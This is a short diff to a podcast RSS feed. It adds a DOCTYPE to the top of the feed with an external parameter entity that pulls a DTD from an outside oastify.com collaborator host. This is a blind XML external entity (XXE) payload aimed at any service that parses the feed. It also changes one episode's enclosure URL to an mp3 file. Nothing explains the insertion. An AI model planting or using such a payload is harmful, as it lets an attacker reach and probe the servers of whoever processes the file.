@@ -1,4 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [  
+<!ENTITY % remote SYSTEM "http://k6rcix6r0djd7wztgpklvlb8dzjq7lva.oastify.com/xxe">
+  %remote;
+]>
 <rss
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
@@ -49,7 +53,7 @@
 				<![CDATA[dx]]>
 			</dc:creator>
 			<pubDate>Thu, 18 Sep 2025 22:49:21 GMT</pubDate>
-			<enclosure url="https://dxdsec.tech/index.html" type="text/html"/>
+			<enclosure url="https://dxdsec.tech/aud.mp3" type="audio/mpeg"/>
 			<itunes:explicit>false</itunes:explicit>
 			<itunes:duration>00:00:15</itunes:duration>
 			<itunes:image href="https://d3t3ozftmdmh3i.cloudfront.net/staging/podcast_uploaded_episode/44446066/c5d95302d15af2ee.jpg"/>
